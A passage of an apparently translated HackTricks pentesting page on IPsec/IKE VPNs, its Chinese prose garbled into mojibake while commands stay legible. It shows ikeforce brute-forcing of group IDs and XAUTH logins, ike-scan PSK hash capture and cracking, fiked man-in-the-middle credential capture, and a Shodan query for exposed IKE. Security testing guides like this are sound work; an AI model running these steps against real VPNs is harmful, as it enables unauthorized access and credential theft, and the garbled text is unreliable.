<li><strong>ç¬¬äºŒç§æ–¹æ³•</strong>æ˜¯ <strong>æ£€æŸ¥æ¯æ¬¡å°è¯•å‘é€çš„å“åº”æ•°é‡</strong>ï¼Œå› ä¸ºæœ‰æ—¶åœ¨ä½¿ç”¨æ­£ç¡® ID æ—¶ä¼šå‘é€æ›´å¤šæ•°æ®åŒ…ã€‚</li>
<li><strong>ç¬¬ä¸‰ç§æ–¹æ³•</strong>æ˜¯ <strong>æœç´¢å¯¹æ— æ•ˆ ID çš„å“åº”ä¸­çš„ "INVALID-ID-INFORMATION"</strong>ã€‚</li>
<li>æœ€åï¼Œå¦‚æœæœåŠ¡å™¨å¯¹æ£€æŸ¥æ²¡æœ‰ä»»ä½•å›å¤ï¼Œ<strong>ikeforce</strong> å°†å°è¯•æš´åŠ›ç ´è§£æœåŠ¡å™¨ï¼Œå¹¶æ£€æŸ¥åœ¨å‘é€æ­£ç¡® ID æ—¶æœåŠ¡å™¨æ˜¯å¦å›å¤æŸäº›æ•°æ®åŒ…ã€‚<br />
æ˜¾ç„¶ï¼Œæš´åŠ›ç ´è§£ ID çš„ç›®æ ‡æ˜¯è·å– <strong>PSK</strong>ï¼Œå½“ä½ æ‹¥æœ‰æœ‰æ•ˆ ID æ—¶ã€‚ç„¶åï¼Œä½¿ç”¨ <strong>ID</strong> å’Œ <strong>PSK</strong> ä½ å°†éœ€è¦æš´åŠ›ç ´è§£ XAUTHï¼ˆå¦‚æœå¯ç”¨çš„è¯ï¼‰ã€‚</li>
</ul>
<p>å¦‚æœä½ å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ° ikeforce å‘½ä»¤ä¸­ã€‚å¦‚æœä½ å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œè¯·éšæ„æ·»åŠ ä¸€ä¸ªæ–°å¾ªç¯ä»¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼ˆä½ åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œï¼‰ã€‚</p>
<pre><code class="language-bash">git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
</code></pre>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; -e -w ./wordlists/groupnames.dic
</code></pre>
<h3 id="sniffing-id"><a class="header" href="#sniffing-id">Sniffing ID</a></h3>
<p>(æ¥è‡ªä¹¦ç± <strong>Network Security Assessment: Know Your Network</strong>): é€šè¿‡å—…æ¢VPNå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œä¹Ÿå¯ä»¥è·å¾—æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå› ä¸ºç¬¬ä¸€ä¸ªåŒ…å«å®¢æˆ·ç«¯IDçš„æ”»å‡»æ¨¡å¼æ•°æ®åŒ…æ˜¯ä»¥æ˜æ–‡å‘é€çš„ã€‚</p>
<p><img src="../.gitbook/assets/image%20(891).png" alt="" /></p>
<h2 id="capturing--cracking-the-hash"><a class="header" href="#capturing--cracking-the-hash">Capturing &amp; cracking the hash</a></h2>
<p>æœ€åï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº† <strong>æœ‰æ•ˆçš„è½¬æ¢</strong> å’Œ <strong>ç»„å</strong>ï¼Œå¹¶ä¸” <strong>å…è®¸æ”»å‡»æ¨¡å¼</strong>ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥éå¸¸è½»æ¾åœ°è·å–å¯ç ´è§£çš„å“ˆå¸Œï¼š</p>
<pre><code class="language-bash">ike-scan -M -A -n &lt;ID&gt; --pskcrack=hash.txt &lt;IP&gt; #If aggressive mode is supported and you know the id, you can get the hash of the passwor
</code></pre>
<p>å“ˆå¸Œå°†ä¿å­˜åœ¨ <em>hash.txt</em> ä¸­ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <strong>psk-crack</strong>ã€<strong>john</strong>ï¼ˆä½¿ç”¨ <a href="https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py"><strong>ikescan2john.py</strong></a>ï¼‰å’Œ <strong>hashcat</strong> æ¥ <strong>crack</strong> å“ˆå¸Œï¼š</p>
<pre><code class="language-bash">psk-crack -d &lt;Wordlist_path&gt; psk.txt
</code></pre>
<h2 id="xauth"><a class="header" href="#xauth"><strong>XAuth</strong></a></h2>
<p><strong>Aggressive mode IKE</strong> ç»“åˆ <strong>é¢„å…±äº«å¯†é’¥ (PSK)</strong> é€šå¸¸ç”¨äº <strong>ç»„è®¤è¯</strong> ç›®çš„ã€‚æ­¤æ–¹æ³•é€šè¿‡ <strong>XAuth (æ‰©å±•è®¤è¯)</strong> å¾—åˆ°å¢å¼ºï¼Œåè€…ç”¨äºå¼•å…¥é¢å¤–çš„ <strong>ç”¨æˆ·è®¤è¯</strong> å±‚ã€‚æ­¤ç±»è®¤è¯é€šå¸¸åˆ©ç”¨ <strong>Microsoft Active Directory</strong>ã€<strong>RADIUS</strong> æˆ–ç±»ä¼¼ç³»ç»Ÿã€‚</p>
<p>è½¬å‘ <strong>IKEv2</strong> æ—¶ï¼Œè§‚å¯Ÿåˆ°ä¸€ä¸ªæ˜¾è‘—çš„å˜åŒ–ï¼Œå³ <strong>EAP (å¯æ‰©å±•è®¤è¯åè®®)</strong> è¢«ç”¨æ¥æ›¿ä»£ <strong>XAuth</strong> è¿›è¡Œç”¨æˆ·è®¤è¯ã€‚è¿™ä¸€å˜åŒ–å¼ºè°ƒäº†å®‰å…¨é€šä¿¡åè®®ä¸­è®¤è¯å®è·µçš„æ¼”å˜ã€‚</p>
<h3 id="æœ¬åœ°ç½‘ç»œ-mitm-æ•è·å‡­è¯"><a class="header" href="#æœ¬åœ°ç½‘ç»œ-mitm-æ•è·å‡­è¯">æœ¬åœ°ç½‘ç»œ MitM æ•è·å‡­è¯</a></h3>
<p>å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <em>fiked</em> æ•è·ç™»å½•æ•°æ®ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•é»˜è®¤ç”¨æˆ·åï¼ˆæ‚¨éœ€è¦å°† IKE æµé‡é‡å®šå‘åˆ° <code>fiked</code> è¿›è¡Œå—…æ¢ï¼Œè¿™å¯ä»¥é€šè¿‡ ARP æ¬ºéª—æ¥å®Œæˆï¼Œ<a href="https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/">æ›´å¤šä¿¡æ¯</a>ï¼‰ã€‚Fiked å°†å……å½“ VPN ç«¯ç‚¹å¹¶æ•è· XAuth å‡­è¯ï¼š</p>
<pre><code class="language-bash">fiked -g &lt;IP&gt; -k testgroup:secretkey -l output.txt -d
</code></pre>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨IPSecå°è¯•è¿›è¡Œä¸­é—´äººæ”»å‡»å¹¶é˜»æ­¢æ‰€æœ‰æµé‡åˆ°ç«¯å£500ï¼Œå¦‚æœæ— æ³•å»ºç«‹IPSecéš§é“ï¼Œæµé‡å¯èƒ½ä¼šä»¥æ˜æ–‡å‘é€ã€‚</p>
<h3 id="ä½¿ç”¨ikeforceæš´åŠ›ç ´è§£xauthç”¨æˆ·åå’Œå¯†ç "><a class="header" href="#ä½¿ç”¨ikeforceæš´åŠ›ç ´è§£xauthç”¨æˆ·åå’Œå¯†ç ">ä½¿ç”¨ikeforceæš´åŠ›ç ´è§£XAUTHç”¨æˆ·åå’Œå¯†ç </a></h3>
<p>è¦æš´åŠ›ç ´è§£<strong>XAUTH</strong>ï¼ˆå½“ä½ çŸ¥é“æœ‰æ•ˆçš„ç»„å<strong>id</strong>å’Œ<strong>psk</strong>æ—¶ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç”¨æˆ·åæˆ–ç”¨æˆ·ååˆ—è¡¨ä»¥åŠä¸€ä¸ªå¯†ç åˆ—è¡¨ï¼š</p>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; -b -i &lt;group_id&gt; -u &lt;username&gt; -k &lt;PSK&gt; -w &lt;passwords.txt&gt; [-s 1]
</code></pre>
<p>è¿™æ ·ï¼Œikeforceå°†å°è¯•ä½¿ç”¨æ¯ä¸ªç”¨æˆ·å:å¯†ç çš„ç»„åˆè¿›è¡Œè¿æ¥ã€‚</p>
<p>å¦‚æœæ‚¨æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼Œåªéœ€åƒä¹‹å‰çš„æ­¥éª¤ä¸€æ ·ä½¿ç”¨å®ƒä»¬ã€‚</p>
<h2 id="ä½¿ç”¨ipsec-vpnè¿›è¡Œèº«ä»½éªŒè¯"><a class="header" href="#ä½¿ç”¨ipsec-vpnè¿›è¡Œèº«ä»½éªŒè¯">ä½¿ç”¨IPSEC VPNè¿›è¡Œèº«ä»½éªŒè¯</a></h2>
<p>åœ¨Kaliä¸­ï¼Œ<strong>VPNC</strong>ç”¨äºå»ºç«‹IPsecéš§é“ã€‚<strong>é…ç½®æ–‡ä»¶</strong>å¿…é¡»ä½äºç›®å½•<code>/etc/vpnc/</code>ä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤_<strong>vpnc</strong>_æ¥å¯åŠ¨è¿™äº›é…ç½®æ–‡ä»¶ã€‚</p>
<p>ä»¥ä¸‹å‘½ä»¤å’Œé…ç½®è¯´æ˜äº†ä½¿ç”¨VPNCè®¾ç½®VPNè¿æ¥çš„è¿‡ç¨‹ï¼š</p>
<pre><code class="language-bash">root@system:~# cat &gt; /etc/vpnc/samplevpn.conf &lt;&lt; STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
</code></pre>
<p>åœ¨æ­¤è®¾ç½®ä¸­ï¼š</p>
<ul>
<li>å°† <code>[VPN_GATEWAY_IP]</code> æ›¿æ¢ä¸º VPN ç½‘å…³çš„å®é™… IP åœ°å€ã€‚</li>
<li>å°† <code>[VPN_CONNECTION_ID]</code> æ›¿æ¢ä¸º VPN è¿æ¥çš„æ ‡è¯†ç¬¦ã€‚</li>
<li>å°† <code>[VPN_GROUP_SECRET]</code> æ›¿æ¢ä¸º VPN çš„ç»„å¯†é’¥ã€‚</li>
<li>å°† <code>[VPN_USERNAME]</code> å’Œ <code>[VPN_PASSWORD]</code> æ›¿æ¢ä¸º VPN èº«ä»½éªŒè¯å‡­æ®ã€‚</li>
<li><code>[PID]</code> è¡¨ç¤ºåœ¨ <code>vpnc</code> å¯åŠ¨æ—¶å°†åˆ†é…çš„è¿›ç¨‹ IDã€‚</li>
</ul>
<p>ç¡®ä¿åœ¨é…ç½® VPN æ—¶ä½¿ç”¨å®é™…çš„ã€å®‰å…¨çš„å€¼æ¥æ›¿æ¢å ä½ç¬¦ã€‚</p>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="http://www.ernw.de/download/pskattack.pdf">PSK ç ´è§£è®ºæ–‡</a></li>
<li><a href="http://www.securityfocus.com/infocus/1821">SecurityFocus æ·±åº¦åˆ†æ</a></li>
<li><a href="http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf">æ‰«æ VPN å®ç°</a></li>
<li>ç½‘ç»œå®‰å…¨è¯„ä¼° ç¬¬3ç‰ˆ</li>
</ul>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:500 IKE</code></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-ldap.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/pentesting-modbus.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-ldap.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/pentesting-modbus.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
